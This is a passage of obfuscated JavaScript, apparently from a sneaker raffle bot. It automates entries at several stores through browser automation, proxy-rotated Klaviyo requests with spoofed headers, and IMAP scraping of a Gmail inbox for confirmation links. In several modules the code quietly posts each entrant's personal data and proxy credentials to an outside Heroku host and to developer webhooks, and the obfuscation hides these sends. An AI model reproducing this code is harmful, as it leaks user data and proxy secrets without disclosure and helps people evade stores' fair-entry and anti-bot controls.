                            console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Logging\x20in'), await _0x259cb7['waitForSelector']('#username'), await _0x259cb7['type']('#username', _0x5ac7cb[_0x129175]['Email']), await _0x259cb7['waitForSelector']('#password'), await _0x259cb7['type']('#password', _0x5ac7cb[_0x129175]['Password']), await _0x289b0b(0x190), await _0x259cb7['click']('#buttonSubmit'), await _0x259cb7['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5ac7cb[_0x129175]['Size']);
                            let _0x3e3355 = _0x5ac7cb[_0x129175]['Size']['replace']('.5', '\x201/2');
                            if (_0x3e3355['toUpperCase']() == 'RANDOM') {
                                const _0x39060f = await _0x259cb7['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x38e9c4 = Math['round'](Math['random']() * (_0x39060f['length'] - 0x1));
                                await _0x39060f[_0x38e9c4]['click']();
                            } else
                                await _0x259cb7['click']('button[aria-label=\x22' + _0x3e3355 + '\x22]');
                            await _0x289b0b(0x1f4);
                            try {
                                await _0x259cb7['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x289b0b(0x12c), console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x259cb7['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_firstName', _0x5ac7cb[_0x129175]['FirstName']), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_lastName', _0x5ac7cb[_0x129175]['LastName']), await _0x289b0b(0x12c), await _0x259cb7['select']('#dwfrm_raffle_addressFields_country', _0x5ac7cb[_0x129175]['Country']), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_city', _0x5ac7cb[_0x129175]['City']), await _0x289b0b(0x12c);
                            _0x5ac7cb[_0x129175]['Postcode'] == undefined && (_0x5ac7cb[_0x129175]['Postcode'] = _0x5ac7cb[_0x129175]['Zip']);
                            await _0x259cb7['type']('#dwfrm_raffle_addressFields_postalCode', _0x5ac7cb[_0x129175]['Postcode']), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_address1', _0x5ac7cb[_0x129175]['Address1']), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_address2', _0x5ac7cb[_0x129175]['HouseNumber']), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x5ac7cb[_0x129175]['Address2']), await _0x289b0b(0x12c), await _0x259cb7['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x289b0b(0x12c), await _0x259cb7['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x5ac7cb[_0x129175]['Follower']), await _0x289b0b(0x1f4), await _0x259cb7['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20' + _0x1ac777['blue']('Awaiting\x20Paypal\x20Payment')), await _0x259cb7['click']('.b-paypal_button');
                            try {
                                await _0x259cb7['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x53edbc = 'no', _0x53c50d(_0x5ac7cb[_0x129175], _0x114f20), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x1f34f1['succesDEVMSG']);
                                await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x1f34f1['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x1f34f1['succesPUBMSG']);
                                let _0x2dcba1 = _0x5ac7cb[_0x129175];
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'module': _0x114f20['name'],
                                        'entrydata': JSON['stringify'](_0x2dcba1),
                                        'proxy': '' + _0x2e5fda[_0x129175]
                                    };
                                    var _0x221969 = JSON['stringify'](prxdata);
                                    let _0x3f5c96 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x221969, _0x3f5c96);
                                } catch (_0x21eb5f) {
                                }
                            } catch (_0x3c9483) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3c9483)), _0x3b4600 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3c9483;
                                var _0x3f3fca = await _0x117512(_0x5ac7cb[_0x129175], _0x114f20, 'dev', !![], _0x3b4600);
                                _0x1f34f1['errorDEV'] = { 'embeds': [_0x3f3fca] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x1f34f1['errorDEV']), await _0x15c654(_0x34ab86, _0x1f34f1['errorDEV']);
                            }
                        } catch (_0x8d9928) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20' + _0x8d9928)), _0x3b4600 = '' + _0x8d9928;
                            var _0x3f3fca = await _0x117512(_0x5ac7cb[_0x129175], _0x114f20, 'dev', !![], _0x3b4600);
                            _0x1f34f1['errorDEV'] = { 'embeds': [_0x3f3fca] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x1f34f1['errorDEV']), await _0x15c654(_0x34ab86, _0x1f34f1['errorDEV']), _0x53edbc = 'yes';
                        } finally {
                            _0x3d0232 && _0x3d0232['close']();
                            if (_0x53edbc == 'yes' && _0x49a261 != 0x5) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Retrying\x20(' + _0x49a261 + '\x20/\x205)')), _0x129175 = _0x129175 - 0x1, _0x49a261 = _0x49a261 + 0x1;
                                continue;
                            }
                            _0x53edbc == 'yes' && _0x49a261 >= 0x5 && (_0x5f4429(_0x5ac7cb[_0x129175], _0x114f20), _0x53edbc = 'no', _0x49a261 = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['AfewDelay'] + '\x20ms'), await _0x289b0b(_0x79d23a['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3c04d7, _0xc08512, _0x1868e2) {
                    for (var _0x327a44 = 0x0; _0x327a44 < _0xc08512['length']; _0x327a44++) {
                        try {
                            await _0x5af4d5(_0xc08512, _0x327a44);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0xb5c55b(_0x1e1ff6, _0x2c2a8e, _0x2dec98, _0x23061c, _0xba43b1) {
                            var _0x3fd80b, _0x5822ad = {}, _0x668030 = [], _0x563670 = {}, _0x89f366 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x15aa1a = Math['round'](Math['random']() * (_0x89f366['length'] - 0x1));
                            !_0x23061c && (_0x23061c = {});
                            if (_0x2c2a8e != 'ver') {
                                _0x25b0b6(_0x2dec98['name'] + '\x20Task\x20' + (_0x1e1ff6 + 0x1) + '\x20/\x20' + _0x23061c['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e), await _0x5af4d5(_0x23061c, _0x1e1ff6), _0x5822ad = _0x2dec98['data'], _0x5822ad['data']['attributes']['email'] = '' + _0x23061c[_0x1e1ff6]['Email'];
                                if (_0x23061c[_0x1e1ff6]['Size'] == 'RANDOM') {
                                }
                                _0x5822ad['data']['attributes']['properties']['$first_name'] = '' + _0x23061c[_0x1e1ff6]['FirstName'], _0x5822ad['data']['attributes']['properties']['$last_name'] = '' + _0x23061c[_0x1e1ff6]['LastName'], _0x5822ad['data']['attributes']['properties']['$address1'] = _0x23061c[_0x1e1ff6]['Address1'] + '\x20' + _0x23061c[_0x1e1ff6]['Address2'] + '\x20' + _0x23061c[_0x1e1ff6]['HouseNumber'], _0x5822ad['data']['attributes']['properties']['$zip'] = '' + _0x23061c[_0x1e1ff6]['Zip'], _0x5822ad['data']['attributes']['properties']['$city'] = '' + _0x23061c[_0x1e1ff6]['City'], _0x5822ad['data']['attributes']['properties']['$country'] = '' + _0x23061c[_0x1e1ff6]['Country'], _0x23061c[_0x1e1ff6]['Size'] == 'RANDOM' ? _0x5822ad['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x89f366[_0x15aa1a] : _0x5822ad['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x23061c[_0x1e1ff6]['Size'], _0x5822ad['data']['attributes']['properties']['$phone_number'] = '' + _0x23061c[_0x1e1ff6]['Phone'], _0x5822ad['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x23061c[_0x1e1ff6]['Follower'];
                            }
                            if (_0x79d23a['useRandomProxy'] = ![])
                                var _0x677c = _0xba43b1[_0x1e1ff6]['split'](':');
                            else
                                var _0x277475 = Math['round'](Math['random']() * (_0xba43b1['length'] - 0x1)), _0x677c = _0xba43b1[_0x277475]['split'](':');
                            var _0x5812ee = {
                                'jar': _0x426561,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2dec98['url'],
                                'headers': _0x2dec98['headers'],
                                'body': JSON['stringify'](_0x5822ad),
                                'proxy': 'http://' + _0x677c[0x2] + ':' + _0x677c[0x3] + '@' + _0x677c[0x0] + ':' + _0x677c[0x1]
                            };
                            return _0x2c2a8e != 'ver' && (_0x5812ee['url'] = _0x2dec98['url'], _0x5812ee['headers'] = _0x2dec98['headers']), _0x2c2a8e == 'ver' && (_0x5812ee['method'] = 'GET'), new Promise(function (_0x2285b6, _0x15e0f9) {
                                callback = async (_0x55edd4, _0x111267, _0x3fae26) => {
                                    if (!_0x55edd4 && _0x111267['statusCode'] == 0xca || !_0x55edd4 && _0x111267['statusCode'] == 0xc8) {
                                        if (_0x2c2a8e != 'ver') {
                                            var _0x1a75e2 = await _0x117512(_0x23061c[_0x1e1ff6], _0x2dec98, 'dev', ![]), _0x3170fd = await _0x117512(_0x23061c[_0x1e1ff6], _0x2dec98, 'pub', ![]);
                                            const _0x318c2f = {
                                                'succesDEVMSG': { 'embeds': [_0x1a75e2] },
                                                'succesPUBMSG': { 'embeds': [_0x3170fd] }
                                            };
                                            let _0xa0491d = _0x23061c[_0x1e1ff6];
                                            try {
                                                prxdata = {
                                                    'username': _0x2e53d0['replace']('#', ''),
                                                    'module': _0x2dec98['name'],
                                                    'entrydata': JSON['stringify'](_0xa0491d),
                                                    'proxy': '' + _0xba43b1[_0x1e1ff6]
                                                };
                                                var _0x394fba = JSON['stringify'](prxdata);
                                                let _0x50e8da = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x394fba, _0x50e8da);
                                            } catch (_0x3f8c19) {
                                            }
                                            if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                                                try {
                                                    await _0x15c654(_0x79d23a['webhook'], _0x318c2f['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x318c2f['succesDEVMSG']), await _0x289b0b(0xc8);
                                            try {
                                                await _0x15c654(_0x1d7baa, _0x318c2f['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x53c50d(_0x23061c[_0x1e1ff6], _0x2dec98);
                                        }
                                        _0x2285b6(console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x2dec98['name'] + ']\x20Task\x20' + (_0x1e1ff6 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x2c2a8e != 'ver') {
                                            var _0x49fd06 = '' + _0x55edd4, _0x573815 = await _0x117512(_0x23061c[_0x1e1ff6], _0x2dec98, 'dev', !![], _0x49fd06), _0x4bf0f8 = {};
                                            _0x4bf0f8['errorDEV'] = { 'embeds': [_0x573815] }, _0x5f4429(_0x23061c[_0x1e1ff6], _0x2dec98), _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4bf0f8['errorDEV']), await _0x15c654(_0x34ab86, _0x4bf0f8['errorDEV']);
                                        }
                                        _0x15e0f9(console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2dec98['name'] + ']\x20Task\x20' + (_0x1e1ff6 + 0x1) + ':\x20' + _0x55edd4)));
                                    }
                                };
                                try {
                                    _0x2c2a8e != 'ver' && console['log'](_0x3d201d() + '\x20[' + _0x2dec98['name'] + ']\x20Task\x20' + (_0x1e1ff6 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5822ad['data']['attributes']['email']), _0x2a2e1d(_0x5812ee, callback);
                                } catch (_0x352b88) {
                                    console['log'](_0x3d201d() + '\x20Task\x20' + (_0x1e1ff6 + 0x1) + ':\x20' + _0x352b88);
                                }
                            });
                        }
                        ;
                        try {
                            await _0xb5c55b(_0x327a44, 'nor', _0x3c04d7, _0xc08512, _0x1868e2), console['log'](_0x3d201d() + '\x20[' + _0x3c04d7['name'] + ']\x20Sleeping\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        } catch (_0x3137d9) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x186b1d, _0xe2d3e8, _0x5b6e9e) {
                    var _0x43ff02 = [], _0x3b3cf8 = ![];
                    async function _0x262492() {
                        var _0x20c39f = new _0x517e1b({
                            'user': _0x79d23a['masterMail'],
                            'password': _0x79d23a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x39e0f2(_0x242dfe) {
                            _0x20c39f['openBox']('INBOX', ![], _0x242dfe);
                        }
                        _0x20c39f['once']('ready', function () {
                            _0x39e0f2(function (_0x48ebf3, _0x4da086) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x48ebf3)
                                    throw _0x48ebf3;
                                _0x20c39f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x45ad1f, _0x30ae94) {
                                    if (!_0x30ae94 || !_0x30ae94['length'])
                                        console['log'](_0x3d201d() + '\x20[' + _0x186b1d['name'] + ']\x20No\x20mails\x20found'), _0x20c39f['end']();
                                    else {
                                        var _0x419c06 = _0x20c39f['seq']['fetch'](_0x30ae94, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x419c06['on']('message', function (_0x53155d, _0x140882) {
                                            var _0x3e15ea = '(#' + _0x140882 + ')\x20';
                                            _0x53155d['on']('body', function (_0x3ba002, _0x5a5ee3) {
                                                _0xa13a33(_0x3ba002, (_0x2a5f56, _0x21e980) => {
                                                    var _0x1f5646 = _0x21e980['text']['split']('(')[0x1], _0x58e68e = _0x1f5646['split'](')')[0x0];
                                                    _0x43ff02['push'](_0x58e68e);
                                                });
                                            }), _0x53155d['once']('end', function () {
                                            });
                                        }), _0x419c06['once']('error', function (_0x2fcf61) {
                                            console['log']('Fetch\x20error:\x20' + _0x2fcf61), _0x3b3cf8 = !![];
                                        }), _0x419c06['once']('end', function () {
                                            _0x20c39f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x20c39f['once']('error', function (_0x1eefde) {
                            console['log'](_0x1ac777['red'](_0x1eefde['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3b3cf8 = !![];
                        }), _0x20c39f['once']('end', async function () {
                            _0x3b3cf8 = !![];
                        }), _0x20c39f['connect']();
                    }
                    async function _0xdfbe88(_0x3053d2, _0x2ea4c, _0x5e42c2) {
                        for (var _0x32ee25 = 0x0; _0x32ee25 < _0x2ea4c['length']; _0x32ee25++) {
                            async function _0x1e5e8e(_0x19f744, _0x4dc442, _0x44cd7c, _0x2a0ca3, _0x3e7b00) {
                                var _0x38c1d9, _0x5eb383 = {}, _0x3c5121 = [], _0x3a487e = {}, _0x2d1807 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x44d093 = Math['round'](Math['random']() * (_0x2d1807['length'] - 0x1));
                                _0x2a0ca3[_0x19f744]['Size'] == 'RANDOM' && (_0x2a0ca3[_0x19f744]['Size'] = _0x2d1807[_0x44d093]);
                                !_0x2a0ca3 && (_0x2a0ca3 = {});
                                if (_0x79d23a['useRandomProxy'] = ![])
                                    var _0x210d36 = _0x3e7b00[_0x19f744]['split'](':');
                                else
                                    var _0x522e20 = Math['round'](Math['random']() * (_0x3e7b00['length'] - 0x1)), _0x210d36 = _0x3e7b00[_0x522e20]['split'](':');
                                var _0x57d126 = {
                                    'jar': _0x426561,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x44cd7c['url'],
                                    'headers': _0x44cd7c['headers'],
                                    'body': JSON['stringify'](_0x5eb383),
                                    'proxy': 'http://' + _0x210d36[0x2] + ':' + _0x210d36[0x3] + '@' + _0x210d36[0x0] + ':' + _0x210d36[0x1]
                                };
                                return _0x4dc442 != 'ver' && (_0x57d126['url'] = _0x44cd7c['url'], _0x57d126['headers'] = _0x44cd7c['headers']), _0x4dc442 == 'ver' && (_0x57d126['method'] = 'GET', _0x57d126['url'] = _0x2a0ca3[_0x19f744]), new Promise(function (_0x152e39, _0x1322d0) {
                                    callback = async (_0x58dc31, _0x5d61ca, _0x1b27d1) => {
                                        if (!_0x58dc31 && _0x5d61ca['statusCode'] == 0xca || !_0x58dc31 && _0x5d61ca['statusCode'] == 0xc8) {
                                            if (_0x4dc442 != 'ver') {
                                                var _0x1343c2 = await _0x117512(_0x2a0ca3[_0x19f744], _0x44cd7c, 'dev', ![]), _0x1cb679 = await _0x117512(_0x2a0ca3[_0x19f744], _0x44cd7c, 'pub', ![]);
                                                const _0x2eebdf = {
                                                    'succesDEVMSG': { 'embeds': [_0x1343c2] },
                                                    'succesPUBMSG': { 'embeds': [_0x1cb679] }
                                                };
                                                if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                                                    try {
                                                        await _0x15c654(_0x79d23a['webhook'], _0x2eebdf['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x2eebdf['succesDEVMSG']), await _0x289b0b(0xc8);
                                                try {
                                                    await _0x15c654(_0x1d7baa, _0x2eebdf['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x53c50d(_0x2a0ca3[_0x19f744], _0x44cd7c);
                                            }
                                            _0x152e39(console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x44cd7c['name'] + ']\x20Task\x20' + (_0x19f744 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4dc442 != 'ver') {
                                                var _0x29712c = '' + _0x58dc31, _0xfcbcb3 = await _0x117512(_0x2a0ca3[_0x19f744], _0x44cd7c, 'dev', !![], _0x29712c), _0x2402a0 = {};
                                                _0x2402a0['errorDEV'] = { 'embeds': [_0xfcbcb3] }, _0x5f4429(_0x2a0ca3[_0x19f744], _0x44cd7c), _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x2402a0['errorDEV']), await _0x15c654(_0x34ab86, _0x2402a0['errorDEV']);
                                            }
                                            _0x1322d0(console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x44cd7c['name'] + ']\x20Task\x20' + (_0x19f744 + 0x1) + ':\x20' + _0x58dc31)));
                                        }
                                    };
                                    try {
                                        _0x4dc442 != 'ver' ? console['log'](_0x3d201d() + '\x20[' + _0x44cd7c['name'] + ']\x20Task\x20' + (_0x19f744 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5eb383['data']['attributes']['email']) : console['log'](_0x3d201d() + '\x20[' + _0x44cd7c['name'] + ']\x20Task\x20' + (_0x19f744 + 0x1) + ':\x20Fetching\x20Response'), _0x2a2e1d(_0x57d126, callback);
                                    } catch (_0x4550f7) {
                                        console['log'](_0x3d201d() + '\x20Task\x20' + (_0x19f744 + 0x1) + ':\x20' + _0x4550f7);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1e5e8e(_0x32ee25, 'ver', _0x3053d2, _0x2ea4c, _0x5e42c2), console['log'](_0x3d201d() + '\x20[' + _0x3053d2['name'] + ']\x20Sleeping\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                            } catch (_0x40e4f6) {
                            }
                        }
                    }
                    try {
                        _0x262492();
                        while (!_0x3b3cf8) {
                            await _0x289b0b(0xbb8);
                        }
                        console['log']('Found\x20' + _0x43ff02['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x289b0b(0x9c4);
                    }
                    await _0xdfbe88(_0x186b1d, _0x43ff02, _0x5b6e9e);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4f2647, _0x3ffe9f, _0x445a85) {
                    var _0x2c1a98 = _0x3ffe9f, _0x33e3ee = 0x0;
                    for (var _0x444684 = 0x0; _0x444684 < _0x3ffe9f['length']; _0x444684++) {
                        maxTasks = _0x79d23a['threads'];
                        while (_0x33e3ee >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        async function _0x336f5b(_0x10f881, _0x4ad348, _0x1d32eb, _0x515f0d) {
                            try {
                                await _0x5af4d5(_0x4ad348, _0x515f0d);
                            } catch (_0x3da91f) {
                                throw new Error(_0x3da91f);
                            }
                            async function _0x32c3c4(_0x318214, _0x2e8b70, _0x3aedf2, _0x45b936, _0x585c6d) {
                                _0x33e3ee++;
                                var _0xf21a46, _0x3b6986 = {}, _0x259844 = [], _0x35496e = {}, _0x27456d = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x303a37 = Math['round'](Math['random']() * (_0x27456d['length'] - 0x1));
                                !_0x45b936 && (_0x45b936 = {});
                                if (_0x2e8b70 != 'ver') {
                                    _0x25b0b6(_0x3aedf2['name'] + '\x20Task\x20' + (_0x318214 + 0x1) + '\x20/\x20' + _0x45b936['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e), _0x259844 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x2e53d0
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x45b936[_0x318214]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x79d23a['delay']
                                            },
                                            {
                                                'name': 'Version',
